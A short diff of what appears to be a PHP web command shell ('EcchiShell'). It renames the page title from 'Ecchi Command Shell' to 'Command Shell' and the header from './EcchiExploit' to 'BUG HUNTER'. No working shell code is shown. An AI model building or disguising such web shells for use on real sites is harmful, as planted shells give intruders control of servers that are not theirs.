@@ -116,7 +116,7 @@ $ecchishell = new EcchiShell;
 
 <head>
     <!-- Primary Meta Tags -->
-    <title>Ecchi Command Shell</title>
+    <title>Command Shell</title>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -245,7 +245,7 @@ $ecchishell = new EcchiShell;
 
     <div class="container-fluid pt-3">
         <div class="text-info text-center">
-            <h5>./EcchiExploit</h5>
+            <h5>BUG HUNTER</h5>
         </div>
     </div>
 
